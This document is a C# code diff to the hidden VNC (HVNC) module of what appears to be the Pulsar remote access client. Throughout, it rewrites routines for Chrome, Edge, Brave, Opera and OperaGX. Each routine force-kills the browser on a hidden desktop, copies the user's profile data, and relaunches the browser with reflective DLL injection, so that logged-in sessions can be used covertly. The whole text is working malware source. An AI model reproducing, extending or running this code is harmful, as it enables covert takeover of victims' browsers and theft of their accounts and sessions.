@@ -19,6 +19,16 @@ namespace Pulsar.Client.Helper.HVNC
         [DllImport("kernel32.dll")]
         private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        private const uint WAIT_OBJECT_0 = 0x00000000;
+        private const uint WAIT_TIMEOUT = 0x00000102;
+        private const uint INFINITE = 0xFFFFFFFF;
+
         private void CloneDirectory(string sourceDir, string destinationDir)
         {
             if (!Directory.Exists(sourceDir))
@@ -141,29 +151,43 @@ namespace Pulsar.Client.Helper.HVNC
         {
             try
             {
-                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data";
-
-                if (!Directory.Exists(path))
+                var braveConfig = BrowserConfiguration.GetConfig("Brave");
+                if (braveConfig == null || !BrowserConfiguration.ValidateConfig(braveConfig))
                 {
+                    Debug.WriteLine("Brave executable not found.");
                     return;
                 }
 
+                Debug.WriteLine($"Found Brave at: {braveConfig.ExecutablePath}");
+
                 string filePath = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
-                this.CreateProc(filePath);
+                STARTUPINFO startupInfo = default(STARTUPINFO);
+                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
+                startupInfo.lpDesktop = this.DesktopName;
+                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
 
-                //string braveEXEPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
-                //if (File.Exists(braveEXEPath))
-                //{
-                //    KDOTInjection.HVNCInjection(braveEXEPath, dllbytes);
-                //}
-                //else
-                //{
-                //    Debug.WriteLine("Brave executable not found.");
-                //    return;
-                //}
+                if (CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
+                {
+                    Debug.WriteLine("Waiting for Brave processes to terminate...");
+                    WaitForProcessCompletion(processInfo, 5000);
+                }
+                else
+                {
+                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
+                    Thread.Sleep(500);
+                }
 
-                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application", "\\BraveSoftware", "chrome.dll");
-                patcher.Start();
+                CloneBrowserProfile(braveConfig.SearchPattern, braveConfig.ReplacementPath);
+
+                try
+                {
+                    KDOTInjector.Start(dllbytes, braveConfig.ExecutablePath, braveConfig.SearchPattern, braveConfig.ReplacementPath);
+                    Debug.WriteLine("Brave started successfully with reflective DLL injection.");
+                }
+                catch (Exception injectionEx)
+                {
+                    Debug.WriteLine($"Error during Brave DLL injection: {injectionEx.Message}");
+                }
             }
             catch (Exception ex)
             {
@@ -175,48 +199,49 @@ namespace Pulsar.Client.Helper.HVNC
         {
             try
             {
-                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\";
-                if (!Directory.Exists(path)) return;
-
-                string sourceDir = path;
-                string text = Path.Combine(Path.GetDirectoryName(path), "fudasf");
-                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
-
-                if (!Directory.Exists(text))
+                var operaConfig = BrowserConfiguration.GetConfig("Opera");
+                if (operaConfig == null || !BrowserConfiguration.ValidateConfig(operaConfig))
                 {
-                    Directory.CreateDirectory(text);
-                    this.CreateProc(killCommand);
-                    this.CloneDirectory(sourceDir, text);
-                }
-                else
-                {
-                    DeleteFolder(text);
-                    this.StartOpera(dllbytes);
+                    Debug.WriteLine("Opera executable not found.");
                     return;
                 }
 
-                string operaEXEPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Programs\\Opera\\opera.exe";
+                Debug.WriteLine($"Found Opera at: {operaConfig.ExecutablePath}");
 
-                //Inject before patching
-                //if (File.Exists(operaEXEPath) && dllbytes != null && dllbytes.Length > 0)
-                //{
-                //    KDOTInjection.HVNCInjection(operaEXEPath, dllbytes);
-                //}
-                //else
-                //{
-                //    Debug.WriteLine("Opera executable not found or DLL bytes missing.");
-                //    return;
-                //}
+                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
+                STARTUPINFO startupInfo = default(STARTUPINFO);
+                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
+                startupInfo.lpDesktop = this.DesktopName;
+                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
 
-                string startCommand = "Conhost --headless cmd.exe /c start \"\" " + $"\"{operaEXEPath}\"" + " --user-data-dir=\"" + text + "\"";
-                this.CreateProc(startCommand);
-
-                // wait 2 seconds then patch (it's startup up anyway doesn't matter)
-                Thread.Sleep(2000);
-                Task.Run(async () =>
+                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                 {
-                    await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
-                });
+                    Debug.WriteLine("Waiting for Opera processes to terminate...");
+                    WaitForProcessCompletion(processInfo, 5000);
+                }
+                else
+                {
+                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
+                    Thread.Sleep(500);
+                }
+
+                CloneBrowserProfile(operaConfig.SearchPattern, operaConfig.ReplacementPath);
+
+                try
+                {
+                    KDOTInjector.Start(dllbytes, operaConfig.ExecutablePath, operaConfig.SearchPattern, operaConfig.ReplacementPath);
+                    Debug.WriteLine("Opera started successfully with reflective DLL injection.");
+
+                    Thread.Sleep(2000);
+                    Task.Run(async () =>
+                    {
+                        await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                    });
+                }
+                catch (Exception injectionEx)
+                {
+                    Debug.WriteLine($"Error during Opera DLL injection: {injectionEx.Message}");
+                }
             }
             catch (Exception ex)
             {
@@ -228,48 +253,50 @@ namespace Pulsar.Client.Helper.HVNC
         {
             try
             {
-                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\";
-                if (!Directory.Exists(path)) return;
-
-                string sourceDir = path;
-                string text = Path.Combine(Path.GetDirectoryName(path), "fudasf");
-                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";
-
-                if (!Directory.Exists(text))
+                var operaGXConfig = BrowserConfiguration.GetConfig("OperaGX");
+                if (operaGXConfig == null || !BrowserConfiguration.ValidateConfig(operaGXConfig))
                 {
-                    Directory.CreateDirectory(text);
-                    this.CreateProc(killCommand);
-                    this.CloneDirectory(sourceDir, text);
-                }
-                else
-                {
-                    DeleteFolder(text);
-                    this.StartOperaGX(dllbytes);
+                    Debug.WriteLine("OperaGX executable not found.");
                     return;
                 }
 
-                string operaGXEXEPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Programs\\Opera GX\\opera.exe";
+                Debug.WriteLine($"Found OperaGX at: {operaGXConfig.ExecutablePath}");
 
-                //Inject before patching
-                //if (File.Exists(operaGXEXEPath) && dllbytes != null && dllbytes.Length > 0)
-                //{
-                //    KDOTInjection.HVNCInjection(operaGXEXEPath, dllbytes);
-                //}
-                //else
-                //{
-                //    Debug.WriteLine("OperaGX executable not found or DLL bytes missing.");
-                //    return;
-                //}
+                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";
+                STARTUPINFO startupInfo = default(STARTUPINFO);
+                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
+                startupInfo.lpDesktop = this.DesktopName;
+                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
 
-                string startCommand = "Conhost --headless cmd.exe /c start \"\" " + $"\"{operaGXEXEPath}\"" + " --user-data-dir=\"" + text + "\"";
-                Debug.WriteLine(startCommand);
-                this.CreateProc(startCommand);
-
-                Thread.Sleep(2000);
-                Task.Run(async () =>
+                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                 {
-                    await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
-                });
+                    Debug.WriteLine("Waiting for OperaGX processes to terminate...");
+                    WaitForProcessCompletion(processInfo, 5000);
+                }
+                else
+                {
+                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
+                    Thread.Sleep(500);
+                }
+
+                CloneBrowserProfile(operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath);
+
+                try
+                {
+                    KDOTInjector.Start(dllbytes, operaGXConfig.ExecutablePath, operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath);
+                    Debug.WriteLine("OperaGX started successfully with reflective DLL injection.");
+
+                    // Apply Opera patcher asynchronously after injection
+                    Thread.Sleep(2000);
+                    Task.Run(async () =>
+                    {
+                        await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                    });
+                }
+                catch (Exception injectionEx)
+                {
+                    Debug.WriteLine($"Error during OperaGX DLL injection: {injectionEx.Message}");
+                }
             }
             catch (Exception ex)
             {
@@ -281,32 +308,43 @@ namespace Pulsar.Client.Helper.HVNC
         {
             try
             {
-                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\";
-                if (!Directory.Exists(path))
+                var edgeConfig = BrowserConfiguration.GetConfig("Edge");
+                if (edgeConfig == null || !BrowserConfiguration.ValidateConfig(edgeConfig))
                 {
+                    Debug.WriteLine("Edge executable not found.");
                     return;
                 }
 
+                Debug.WriteLine($"Found Edge at: {edgeConfig.ExecutablePath}");
+
                 string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
-                this.CreateProc(filePath);
+                STARTUPINFO startupInfo = default(STARTUPINFO);
+                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
+                startupInfo.lpDesktop = this.DesktopName;
+                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
 
-                // Use PROGRAMFILES for the default Edge install location
-                string programFiles = Environment.GetEnvironmentVariable("PROGRAMFILES(X86)");
-                string edgeExe = programFiles + "\\Microsoft\\Edge\\Application\\msedge.exe";
-                string edgeAppDir = programFiles + "\\Microsoft\\Edge\\Application";
+                if (CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
+                {
+                    Debug.WriteLine("Waiting for Edge processes to terminate...");
+                    WaitForProcessCompletion(processInfo, 5000);
+                }
+                else
+                {
+                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
+                    Thread.Sleep(500);
+                }
 
-                //if (File.Exists(edgeExe) && dllbytes != null && dllbytes.Length > 0)
-                //{
-                //    KDOTInjection.HVNCInjection(edgeExe, dllbytes);
-                //}
-                //else
-                //{
-                //    Debug.WriteLine("Edge executable not found or DLL bytes missing.");
-                //    return;
-                //}
+                CloneBrowserProfile(edgeConfig.SearchPattern, edgeConfig.ReplacementPath);
 
-                PrinterPatcher patcher = new PrinterPatcher(edgeExe, edgeAppDir, "\\Microsoft\\Edge", "msedge.dll");
-                patcher.Start();
+                try
+                {
+                    KDOTInjector.Start(dllbytes, edgeConfig.ExecutablePath, edgeConfig.SearchPattern, edgeConfig.ReplacementPath);
+                    Debug.WriteLine("Edge started successfully with reflective DLL injection.");
+                }
+                catch (Exception injectionEx)
+                {
+                    Debug.WriteLine($"Error during Edge DLL injection: {injectionEx.Message}");
+                }
             }
             catch (Exception ex)
             {
@@ -318,52 +356,133 @@ namespace Pulsar.Client.Helper.HVNC
         {
             try
             {
-                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\";
-
-                if (!Directory.Exists(path))
-                {
-                    return;
-                }
-
-                string sourceDir = Path.Combine(path, "User Data");
-
-                string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
-                this.CreateProc(filePath);
-
-                //TODO: CHANGE TO WATCHING FOR THE CREATPROC ABOVE TO END INSTEAD OF A FIXED SLEEP
-                Thread.Sleep(500);
-
-                string chromeEXEPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe";
-                string chromeEXEPath32 = Environment.GetEnvironmentVariable("PROGRAMFILES(X86)") + "\\Google\\Chrome\\Application\\chrome.exe";
-                
-
-                if (File.Exists(chromeEXEPath))
-                {
-                    KDOTInjection.HVNCInjection(chromeEXEPath, dllbytes);
-                    Debug.WriteLine("Injected into 64-bit Chrome.");
-                }
-                else if (File.Exists(chromeEXEPath32))
-                {
-                    KDOTInjection.HVNCInjection(chromeEXEPath32, dllbytes);
-                    Debug.WriteLine("Injected into 32-bit Chrome.");
-                }
-                else
+                var chromeConfig = BrowserConfiguration.GetChromeConfig();
+                if (chromeConfig == null)
                 {
                     Debug.WriteLine("Chrome executable not found.");
                     return;
                 }
 
-                
+                Debug.WriteLine($"Found Chrome at: {chromeConfig.ExecutablePath}");
+
+                string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
+                STARTUPINFO startupInfo = default(STARTUPINFO);
+                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
+                startupInfo.lpDesktop = this.DesktopName;
+                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
+
+                if (CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
+                {
+                    Debug.WriteLine("Waiting for Chrome processes to terminate...");
+                    WaitForProcessCompletion(processInfo, 5000);
+                }
+                else
+                {
+                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
+                    Thread.Sleep(500);
+                }
+
+                CloneBrowserProfile(chromeConfig.SearchPattern, chromeConfig.ReplacementPath);
+
+                try
+                {
+                    KDOTInjector.Start(dllbytes, chromeConfig.ExecutablePath, chromeConfig.SearchPattern, chromeConfig.ReplacementPath);
+                    Debug.WriteLine("Chrome started successfully with reflective DLL injection.");
+                }
+                catch (Exception injectionEx)
+                {
+                    Debug.WriteLine($"Error during DLL injection: {injectionEx.Message}");
+                    return;
+                }
             }
             catch (Exception ex)
             {
                 Debug.WriteLine("Error starting Chrome: " + ex.Message);
                 return;
             }
+        }
 
-            Debug.WriteLine("Chrome started successfully.");
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
 
-            return;
+        /// <summary>
+        /// Generic method to start any browser by type with reflective DLL injection
+        /// </summary>
+        /// <param name="browserType">Type of browser (Chrome, Edge, Brave, Opera, OperaGX)</param>
+        /// <param name="dllbytes">DLL bytes to inject</param>
+        public void StartBrowser(string browserType, byte[] dllbytes)
+        {
+            try
+            {
+                if (browserType.Equals("Chrome", StringComparison.OrdinalIgnoreCase))
+                {
+                    Startchrome(dllbytes);
+                    return;
+                }
+
+                var config = BrowserConfiguration.GetConfig(browserType);
+                if (config == null || !BrowserConfiguration.ValidateConfig(config))
+                {
+                    Debug.WriteLine($"{browserType} executable not found.");
+                    return;
+                }
+
+                Debug.WriteLine($"Found {browserType} at: {config.ExecutablePath}");
+
+                string processName = Path.GetFileNameWithoutExtension(config.ExecutablePath).ToLower();
+                string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {processName}.exe /F";
+
+                STARTUPINFO startupInfo = default(STARTUPINFO);
+                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
+                startupInfo.lpDesktop = this.DesktopName;
+                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
+
+                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
+                {
+                    Debug.WriteLine($"Waiting for {browserType} processes to terminate...");
+                    WaitForProcessCompletion(processInfo, 5000);
+                }
+                else
+                {
+                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
+                    Thread.Sleep(500);
+                }
+
+                CloneBrowserProfile(config.SearchPattern, config.ReplacementPath);
+
+                try
+                {
+                    KDOTInjector.Start(dllbytes, config.ExecutablePath, config.SearchPattern, config.ReplacementPath);
+                    Debug.WriteLine($"{browserType} started successfully with reflective DLL injection.");
+
+                    if (browserType.Equals("Opera", StringComparison.OrdinalIgnoreCase) ||
+                          browserType.Equals("OperaGX", StringComparison.OrdinalIgnoreCase))
+                    {
+                        Thread.Sleep(2000);
+                        Task.Run(async () =>
+            {
+                await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+            });
+                    }
+                }
+                catch (Exception injectionEx)
+                {
+                    Debug.WriteLine($"Error during {browserType} DLL injection: {injectionEx.Message}");
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error starting {browserType}: {ex.Message}");
+            }
+        }
+
+        public bool CreateProc(string filePath)
+        {
+            STARTUPINFO structure = default(STARTUPINFO);
+            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
+            structure.lpDesktop = this.DesktopName;
+            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
+            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
         }
 
         public void StartDiscord()
@@ -402,13 +521,86 @@ namespace Pulsar.Client.Helper.HVNC
             this.CreateProc(explorerPath);
         }
 
-        public bool CreateProc(string filePath)
+        /// <summary>
+        /// Clones browser profile from SearchPattern to ReplacementPath
+        /// </summary>
+        /// <param name="searchPattern">Relative path pattern (e.g., "Local\Google\Chrome\User Data")</param>
+        /// <param name="replacementPath">Relative path for destination (e.g., "Local\Google\Chrome\KDOT")</param>
+        private void CloneBrowserProfile(string searchPattern, string replacementPath)
         {
-            STARTUPINFO structure = default(STARTUPINFO);
-            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
-            structure.lpDesktop = this.DesktopName;
-            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
-            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
+            try
+            {
+                string baseDir;
+                if (searchPattern.StartsWith("Local\\", StringComparison.OrdinalIgnoreCase))
+                {
+                    baseDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                    searchPattern = searchPattern.Substring(6); // rem "Local\" prefix
+                    replacementPath = replacementPath.Substring(6); // rem "Local\" prefix
+                }
+                else if (searchPattern.StartsWith("Roaming\\", StringComparison.OrdinalIgnoreCase))
+                {
+                    baseDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                    searchPattern = searchPattern.Substring(8); // rem "Roaming\" prefix
+                    replacementPath = replacementPath.Substring(8); // rem "Roaming\" prefix
+                }
+                else
+                {
+                    Debug.WriteLine($"Invalid search pattern format: {searchPattern}");
+                    return;
+                }
+
+                string sourceDir = Path.Combine(baseDir, searchPattern);
+                string destDir = Path.Combine(baseDir, replacementPath);
+
+                Debug.WriteLine($"Cloning browser profile from '{sourceDir}' to '{destDir}'");
+
+                if (!Directory.Exists(sourceDir))
+                {
+                    Debug.WriteLine($"Source directory does not exist: {sourceDir}");
+                    return;
+                }
+
+                // get rid of it if it's already there
+                if (Directory.Exists(destDir))
+                {
+                    Debug.WriteLine($"Removing existing destination directory: {destDir}");
+                    DeleteFolder(destDir);
+                }
+
+                CloneDirectory(sourceDir, destDir);
+                Debug.WriteLine("Browser profile cloned successfully.");
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error cloning browser profile: {ex.Message}");
+            }
+        }
+
+        /// <summary>
+        /// Waits for a process to complete with a timeout
+        /// </summary>
+        /// <param name="processInfo">Process information structure</param>
+        /// <param name="timeoutMs">Timeout in milliseconds (default 5000ms)</param>
+        /// <returns>True if process completed within timeout, false otherwise</returns>
+        private bool WaitForProcessCompletion(PROCESS_INFORMATION processInfo, uint timeoutMs = 5000)
+        {
+            try
+            {
+                if (processInfo.hProcess == IntPtr.Zero)
+                    return false;
+
+                uint result = WaitForSingleObject(processInfo.hProcess, timeoutMs);
+
+                CloseHandle(processInfo.hProcess);
+                CloseHandle(processInfo.hThread);
+
+                return result == WAIT_OBJECT_0;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error waiting for process: {ex.Message}");
+                return false;
+            }
         }
 
         private string DesktopName;
